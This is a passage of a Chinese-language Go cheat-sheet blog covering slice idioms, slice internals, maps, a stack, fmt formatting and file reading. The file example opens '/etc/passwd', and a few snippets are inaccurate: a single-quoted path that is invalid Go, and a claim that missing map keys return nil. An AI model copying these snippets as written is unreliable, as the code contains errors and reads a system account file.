class="keyword">func</span> <span class="params">(s ByLength)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s[i]) &lt; <span class="built_in">len</span>(s[j])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fruits := []<span class="keyword">string</span>&#123;<span class="string">"peach"</span>, <span class="string">"banana"</span>, <span class="string">"kiwi"</span>&#125;</span><br><span class="line">sort.Sort(ByLength(fruits))</span><br></pre></td></tr></table></figure><h4 id="就地去重，需要先排序"><a href="#就地去重，需要先排序" class="headerlink" title="就地去重，需要先排序"></a>就地去重，需要先排序</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"sort"</span></span><br><span class="line"></span><br><span class="line">in := []<span class="keyword">int</span>&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>&#125; <span class="comment">// any item can be sorted</span></span><br><span class="line">sort.Ints(in)</span><br><span class="line">j := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(in); i++ &#123;</span><br><span class="line">    <span class="keyword">if</span> in[j] == in[i] &#123;</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    j++</span><br><span class="line">    <span class="comment">// preserve the original data</span></span><br><span class="line">    <span class="comment">// in[i], in[j] = in[j], in[i]</span></span><br><span class="line">    <span class="comment">// only set what is required</span></span><br><span class="line">    in[j] = in[i]</span><br><span class="line">&#125;</span><br><span class="line">result := in[:j+<span class="number">1</span>]</span><br><span class="line">fmt.Println(result) <span class="comment">// [1 2 3 4]</span></span><br></pre></td></tr></table></figure><h4 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">append</span>(a[:i], a[i+<span class="number">1</span>:]...)</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">a = a[:i+<span class="built_in">copy</span>(a[i:], a[i+<span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 快版本，改变了相对顺序</span></span><br><span class="line">a := []<span class="keyword">string</span>&#123;<span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>&#125;</span><br><span class="line">i := <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove the element at index i from a.</span></span><br><span class="line">a[i] = a[<span class="built_in">len</span>(a)<span class="number">-1</span>] <span class="comment">// Copy last element to index i.</span></span><br><span class="line">a[<span class="built_in">len</span>(a)<span class="number">-1</span>] = <span class="string">""</span>   <span class="comment">// Erase last element (write zero value).</span></span><br><span class="line">a = a[:<span class="built_in">len</span>(a)<span class="number">-1</span>]   <span class="comment">// Truncate slice.</span></span><br><span class="line"></span><br><span class="line">fmt.Println(a) <span class="comment">// [A B E D]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 慢版本，保持相对顺序</span></span><br><span class="line"><span class="built_in">copy</span>(a[i:], a[i+<span class="number">1</span>:]) <span class="comment">// Shift a[i+1:] left one index.</span></span><br><span class="line">a[<span class="built_in">len</span>(a)<span class="number">-1</span>] = <span class="string">""</span>     <span class="comment">// Erase last element (write zero value).</span></span><br><span class="line">a = a[:<span class="built_in">len</span>(a)<span class="number">-1</span>]     <span class="comment">// Truncate slice.</span></span><br></pre></td></tr></table></figure><h4 id="切片比较"><a href="#切片比较" class="headerlink" title="切片比较"></a>切片比较</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">reflect.DeepEqual(s1, s2)</span><br><span class="line"><span class="comment">// 还可以用来比较 map</span></span><br></pre></td></tr></table></figure><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><p>To replace the contents of a slice with the same elements but in reverse order:</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="built_in">len</span>(a)/<span class="number">2</span><span class="number">-1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">    opp := <span class="built_in">len</span>(a)<span class="number">-1</span>-i</span><br><span class="line">    a[i], a[opp] = a[opp], a[i]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The same thing, except with two indices:</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> left, right := <span class="number">0</span>, <span class="built_in">len</span>(a)<span class="number">-1</span>; left &lt; right; left, right = left+<span class="number">1</span>, right<span class="number">-1</span> &#123;</span><br><span class="line">    a[left], a[right] = a[right], a[left]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><p><a href="https://github.com/golang/go/blob/440f7d64048cd94cba669e16fe92137ce6b84073/src/runtime/slice.go" target="_blank" rel="noopener">https://github.com/golang/go/blob/440f7d64048cd94cba669e16fe92137ce6b84073/src/runtime/slice.go</a></p><p>加深理解：<a href="https://www.calhoun.io/why-are-slices-sometimes-altered-when-passed-by-value-in-go/" target="_blank" rel="noopener">https://www.calhoun.io/why-are-slices-sometimes-altered-when-passed-by-value-in-go/</a></p><p>所以传值的时候，slice 对应的变量是拷贝的，但里面指向的 array 没变，除非 append 等操作改变了这个指针。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type slice struct &#123;</span><br><span class="line">    array unsafe.Pointer</span><br><span class="line">    len   int</span><br><span class="line">    cap   int</span><br><span class="line">&#125;</span><br><span class="line">      +--------+</span><br><span class="line">      |        |</span><br><span class="line">      |  ptr   |+------------+-------+-----------+</span><br><span class="line">      |        |                     |           |</span><br><span class="line">      +--------+                     |           |</span><br><span class="line">      |        |                     |           |</span><br><span class="line">      |        |                     |           |</span><br><span class="line">      | len  5 |                     |           |</span><br><span class="line">      |        |                     |           |</span><br><span class="line">      +--------+                     v           v</span><br><span class="line">      |        |             +-----+-----+-----+-----+----+</span><br><span class="line">      |        |             |     |     |     |     |    |</span><br><span class="line">      | cap  5 |     [5]int  |  0  |  1  |  2  |  3  | 4  |</span><br><span class="line">      |        |             +-----+-----+-----+-----+----+</span><br><span class="line">      +--------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       slice := arr[1:4]             arr := [5]int&#123;0,1,2,3,4&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++ &#123;</span><br><span class="line">    s = <span class="built_in">append</span>(s, i)</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(s)</span><br><span class="line">    fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s))</span><br><span class="line">    fmt.Println(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverse</span><span class="params">(s []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    newElem := <span class="number">999</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(s) &lt; <span class="built_in">cap</span>(s) &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Adding an element:"</span>, newElem, <span class="string">"cap:"</span>, <span class="built_in">cap</span>(s), <span class="string">"len:"</span>, <span class="built_in">len</span>(s))</span><br><span class="line">    s = <span class="built_in">append</span>(s, newElem)</span><br><span class="line">    newElem++</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s))</span><br><span class="line">    fmt.Println(s)</span><br><span class="line">    <span class="keyword">for</span> i, j := <span class="number">0</span>, <span class="built_in">len</span>(s)<span class="number">-1</span>; i &lt; j; i++ &#123;</span><br><span class="line">    j = <span class="built_in">len</span>(s) - (i + <span class="number">1</span>)</span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样的结果就很容易理解了</span></span><br><span class="line">Adding an element: <span class="number">999</span> <span class="built_in">cap</span>: <span class="number">7</span> <span class="built_in">len</span>: <span class="number">3</span></span><br><span class="line">Adding an element: <span class="number">1000</span> <span class="built_in">cap</span>: <span class="number">7</span> <span class="built_in">len</span>: <span class="number">4</span></span><br><span class="line">Adding an element: <span class="number">1001</span> <span class="built_in">cap</span>: <span class="number">7</span> <span class="built_in">len</span>: <span class="number">5</span></span><br><span class="line">Adding an element: <span class="number">1002</span> <span class="built_in">cap</span>: <span class="number">7</span> <span class="built_in">len</span>: <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">7</span></span><br><span class="line">[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">999</span> <span class="number">1000</span> <span class="number">1001</span> <span class="number">1002</span>]</span><br><span class="line"><span class="number">3</span> <span class="number">7</span></span><br><span class="line">[<span class="number">1002</span> <span class="number">1001</span> <span class="number">1000</span>]</span><br></pre></td></tr></table></figure><h4 id="Copy"><a href="#Copy" class="headerlink" title="Copy"></a>Copy</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b = make([]T, len(a))</span><br><span class="line">copy(b, a)</span><br><span class="line">// or</span><br><span class="line">b = append([]T(nil), a...)</span><br><span class="line">// or</span><br><span class="line">b = append(a[:0:0], a...)  // See https://github.com/go101/go101/wiki</span><br></pre></td></tr></table></figure><h4 id="Cut"><a href="#Cut" class="headerlink" title="Cut"></a>Cut</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = append(a[:i], a[j:]...)</span><br></pre></td></tr></table></figure><h4 id="Delete-without-preserving-order"><a href="#Delete-without-preserving-order" class="headerlink" title="Delete without preserving order"></a>Delete without preserving order</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[i] = a[len(a)-1] </span><br><span class="line">a = a[:len(a)-1]</span><br></pre></td></tr></table></figure><p><strong>NOTE</strong> If the type of the element is a <em>pointer</em> or a struct with pointer fields, which need to be garbage collected, the above implementations of <code>Cut</code> and <code>Delete</code> have a potential <em>memory leak</em> problem: some elements with values are still referenced by slice <code>a</code> and thus can not be collected. The following code can fix this problem:</p><blockquote><p><strong>Cut</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy(a[i:], a[j:])</span><br><span class="line">for k, n := len(a)-j+i, len(a); k &lt; n; k++ &#123;</span><br><span class="line">    a[k] = nil // or the zero value of T</span><br><span class="line">&#125;</span><br><span class="line">a = a[:len(a)-j+i]</span><br></pre></td></tr></table></figure><blockquote><p><strong>Delete</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if i &lt; len(a)-1 &#123;</span><br><span class="line">  copy(a[i:], a[i+1:])</span><br><span class="line">&#125;</span><br><span class="line">a[len(a)-1] = nil // or the zero value of T</span><br><span class="line">a = a[:len(a)-1]</span><br></pre></td></tr></table></figure><blockquote><p><strong>Delete without preserving order</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[i] = a[len(a)-1]</span><br><span class="line">a[len(a)-1] = nil</span><br><span class="line">a = a[:len(a)-1]</span><br></pre></td></tr></table></figure><h4 id="Expand"><a href="#Expand" class="headerlink" title="Expand"></a>Expand</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = append(a[:i], append(make([]T, j), a[i:]...)...)</span><br></pre></td></tr></table></figure><h4 id="Extend"><a href="#Extend" class="headerlink" title="Extend"></a>Extend</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = append(a, make([]T, j)...)</span><br></pre></td></tr></table></figure><h4 id="Filter-in-place"><a href="#Filter-in-place" class="headerlink" title="Filter (in place)"></a>Filter (in place)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n := 0</span><br><span class="line">for _, x := range a &#123;</span><br><span class="line">    if keep(x) &#123;</span><br><span class="line">    a[n] = x</span><br><span class="line">    n++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a = a[:n]</span><br></pre></td></tr></table></figure><h4 id="Insert"><a href="#Insert" class="headerlink" title="Insert"></a>Insert</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = append(a[:i], append([]T&#123;x&#125;, a[i:]...)...)</span><br></pre></td></tr></table></figure><p><strong>NOTE</strong> The second <code>append</code> creates a new slice with its own underlying storage and copies elements in <code>a[i:]</code> to that slice, and these elements are then copied back to slice <code>a</code> (by the first <code>append</code>). The creation of the new slice (and thus memory garbage) and the second copy can be avoided by using an alternative way:</p><blockquote><p><strong>Insert</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s = append(s, 0 /* use the zero value of the element type */)</span><br><span class="line">copy(s[i+1:], s[i:])</span><br><span class="line">s[i] = x</span><br></pre></td></tr></table></figure><h4 id="InsertVector"><a href="#InsertVector" class="headerlink" title="InsertVector"></a>InsertVector</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = append(a[:i], append(b, a[i:]...)...)</span><br></pre></td></tr></table></figure><h4 id="Push-Front-Unshift"><a href="#Push-Front-Unshift" class="headerlink" title="Push Front/Unshift"></a>Push Front/Unshift</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = append([]T&#123;x&#125;, a...)</span><br></pre></td></tr></table></figure><h4 id="Pop-Front-Shift"><a href="#Pop-Front-Shift" class="headerlink" title="Pop Front/Shift"></a>Pop Front/Shift</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x, a = a[0], a[1:]</span><br></pre></td></tr></table></figure><h3 id="Filtering-without-allocating"><a href="#Filtering-without-allocating" class="headerlink" title="Filtering without allocating"></a>Filtering without allocating</h3><p>This trick uses the fact that a slice shares the same backing array and capacity as the original, so the storage is reused for the filtered slice. Of course, the original contents are modified.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b := a[:0]</span><br><span class="line">for _, x := range a &#123;</span><br><span class="line">    if f(x) &#123;</span><br><span class="line">    b = append(b, x)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For elements which must be garbage collected, the following code can be included afterwards:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i := len(b); i &lt; len(a); i++ &#123;</span><br><span class="line">    a[i] = nil // or the zero value of T</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><h3 id="Shuffling"><a href="#Shuffling" class="headerlink" title="Shuffling"></a>Shuffling</h3><p>Fisher–Yates algorithm:</p><blockquote><p>Since go1.10, this is available at <a href="https://godoc.org/math/rand#Shuffle" target="_blank" rel="noopener">math/rand.Shuffle</a></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i := len(a) - 1; i &gt; 0; i-- &#123;</span><br><span class="line">    j := rand.Intn(i + 1)</span><br><span class="line">    a[i], a[j] = a[j], a[i]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Batching-with-minimal-allocation"><a href="#Batching-with-minimal-allocation" class="headerlink" title="Batching with minimal allocation"></a>Batching with minimal allocation</h3><p>Useful if you want to do batch processing on large slices.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">actions := []int&#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9&#125;</span><br><span class="line">batchSize := 3</span><br><span class="line">batches := make([][]int, 0, (len(actions) + batchSize - 1) / batchSize)</span><br><span class="line"></span><br><span class="line">for batchSize &lt; len(actions) &#123;</span><br><span class="line">    actions, batches = actions[batchSize:], append(batches, actions[0:batchSize:batchSize])</span><br><span class="line">&#125;</span><br><span class="line">batches = append(batches, actions)</span><br></pre></td></tr></table></figure><p>Yields the following:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[0 1 2] [3 4 5] [6 7 8] [9]]</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>哈希表实现，除了 slice、map、function 的内建类型都可以做 key，不含这些字段的 Struct 也可</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)  <span class="comment">// 创建空map</span></span><br><span class="line">m[<span class="string">"one"</span>] = <span class="number">1</span></span><br><span class="line">m[<span class="string">"two"</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="string">"one"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"two"</span>: <span class="number">2</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问，不存在放回 nil</span></span><br><span class="line">one := m[<span class="string">"one"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否存在，为啥能选择返回值？</span></span><br><span class="line">one, ok := m[<span class="string">"one"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">    fmt.Println(k, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(m, <span class="string">"one"</span>)</span><br></pre></td></tr></table></figure><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><blockquote><p>项目要用的话直接 import “github.com/golang-collections/collections/stack”</p><p>用 list 实现 stack</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> stack</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">"container/list"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Stack <span class="keyword">struct</span> &#123;</span><br><span class="line">    list *list.List</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewStack</span><span class="params">()</span> *<span class="title">Stack</span></span> &#123;</span><br><span class="line">    list := list.New()</span><br><span class="line">    <span class="keyword">return</span> &amp;Stack&#123;list&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Push</span><span class="params">(value <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    stack.list.PushBack(value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">    e := stack.list.Back()</span><br><span class="line">    <span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">        stack.list.Remove(e)</span><br><span class="line">        <span class="keyword">return</span> e.Value</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Peak</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">    e := stack.list.Back()</span><br><span class="line">    <span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> e.Value</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> stack.list.Len()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Empty</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> stack.list.Len() == <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>Go 特意做了优化，设计了 rune，可以完美的支持多语言。</p><p><code>&#39;a&#39;</code> 为字符 rune、<code>&quot;abc&quot;</code> 为字符串，`` 可包含复杂的字符串。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := <span class="string">"我爱Go语言!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, ch := <span class="keyword">range</span> []<span class="keyword">rune</span>(s) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"(%d %c)"</span>, i, ch)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (0 我)(1 爱)(2 G)(3 o)(4 语)(5 言)(6 !)</span></span><br><span class="line"></span><br><span class="line">s[i] 并不是字符串，而是 <span class="keyword">uint8</span>，即 ASCII 码，需要转一下 str := <span class="keyword">string</span>(s[i])</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fmt.Printf(<span class="string">"%t\n"</span>, <span class="number">1</span>==<span class="number">2</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%t\n"</span>, <span class="literal">true</span>)  <span class="comment">// 格式化布尔值是简单的。</span></span><br><span class="line">fmt.Printf(<span class="string">"二进制：%b\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"八进制：%o\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"十进制：%d\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"十六进制：%X\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%c\n"</span>, <span class="number">33</span>)  <span class="comment">// 这个输出给定整数的对应字符。</span></span><br><span class="line">fmt.Printf(<span class="string">"浮点数：%f\n"</span>, math.Pi)</span><br><span class="line">fmt.Printf(<span class="string">"字符串：%s\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%q\n"</span>, <span class="string">"\"string\""</span>)  <span class="comment">// 带双引号的字符串</span></span><br><span class="line">fmt.Printf(<span class="string">"%p\n"</span>, &amp;p)  <span class="comment">// 指针</span></span><br><span class="line">fmt.Printf(<span class="string">"类型：%T\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"字段在内的实例的完整信息：%+v\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"字段和限定类型名称在内的实例的完整信息：%#v\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Go 为常规 Go 值的格式化设计提供了多种打印方式。例如，这里打印了 `point` 结构体的一个实例。</span></span><br><span class="line">p := point&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果值是一个结构体，`%+v` 的格式化输出内容将包括结构体的字段名。</span></span><br><span class="line">fmt.Printf(<span class="string">"%+v\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// `%#v` 形式则输出这个值的 Go 语法表示。例如，值的运行源代码片段。</span></span><br><span class="line">fmt.Printf(<span class="string">"%#v\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要打印值的类型，使用 `%T`。</span></span><br><span class="line">fmt.Printf(<span class="string">"%T\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// `%e` 和 `%E` 将浮点型格式化为（稍微有一点不同的）科学记数法表示形式。</span></span><br><span class="line">fmt.Printf(<span class="string">"%e\n"</span>, <span class="number">123400000.0</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%E\n"</span>, <span class="number">123400000.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和上面的整型数一样，`%x` 输出使用 base-16 编码的字符串，每个字节使用 2 个字符表示。</span></span><br><span class="line">fmt.Printf(<span class="string">"%x\n"</span>, <span class="string">"hex this"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当输出数字的时候，你将经常想要控制输出结果的宽度和精度，可以使用在 `%` 后面使用数字来控制输出宽度。</span></span><br><span class="line"><span class="comment">// 默认结果使用右对齐并且通过空格来填充空白部分。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%6d|%6d|\n"</span>, <span class="number">12</span>, <span class="number">345</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你也可以指定浮点型的输出宽度，同时也可以通过 宽度.精度 的语法来指定输出的精度。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%6.2f|%6.2f|\n"</span>, <span class="number">1.2</span>, <span class="number">3.45</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要左对齐，使用 `-` 标志。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%-6.2f|%-6.2f|\n"</span>, <span class="number">1.2</span>, <span class="number">3.45</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你也许也想控制字符串输出时的宽度，特别是要确保他们在类表格输出时的对齐。这是基本的右对齐宽度表示。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%6s|%6s|\n"</span>, <span class="string">"foo"</span>, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要左对齐，和数字一样，使用 `-` 标志。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%-6s|%-6s|\n"</span>, <span class="string">"foo"</span>, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 到目前为止，我们已经看过 `Printf`了，它通过 `os.Stdout`输出格式化的字符串。`Sprintf` 则格式化并返回一个字符串而不带任何输出。</span></span><br><span class="line">s := fmt.Sprintf(<span class="string">"a %s"</span>, <span class="string">"string"</span>)</span><br><span class="line">fmt.Println(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你可以使用 `Fprintf` 来格式化并输出到 `io.Writers`而不是 `os.Stdout`。</span></span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"an %s\n"</span>, <span class="string">"error"</span>)</span><br></pre></td></tr></table></figure><p>还有对应的 strings、strconv 包。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := <span class="string">"This is an example of a string.中文"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前后缀</span></span><br><span class="line"><span class="built_in">println</span>(strings.HasPrefix(s, <span class="string">"This"</span>))</span><br><span class="line"><span class="built_in">println</span>(strings.HasSuffix(s, <span class="string">"string"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含子串</span></span><br><span class="line"><span class="built_in">println</span>(strings.Contains(s, <span class="string">"a "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子串在父串中的索引</span></span><br><span class="line"><span class="built_in">println</span>(strings.Index(s, <span class="string">"is"</span>))</span><br><span class="line"><span class="built_in">println</span>(strings.LastIndex(s, <span class="string">"i"</span>))</span><br><span class="line"><span class="comment">// println(strings.IndexRune(s, []rune("string"))) // 非 ASCII 用这个</span></span><br><span class="line"></span><br><span class="line">strings.Replace()</span><br><span class="line">strings.ToLower(s) <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字转 string，不能 string()，这样等于 chr()</span></span><br><span class="line">strconv.Itoa(<span class="keyword">int</span>(item))  <span class="comment">// 正确操作</span></span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// os.Open</span></span><br><span class="line">f, err := os.Open(<span class="string">'/etc/passwd'</span>)</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">10</span>)</span><br><span class="line">f.Read(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// os.OpenFile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bufio 缓冲</span></span><br><span class="line">r := bufio.NewReader(f)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    str, err := r.ReadString(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(str)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ioutil 一次读完</span></span><br><span class="line">content, err := ioutil.ReadFile(<span 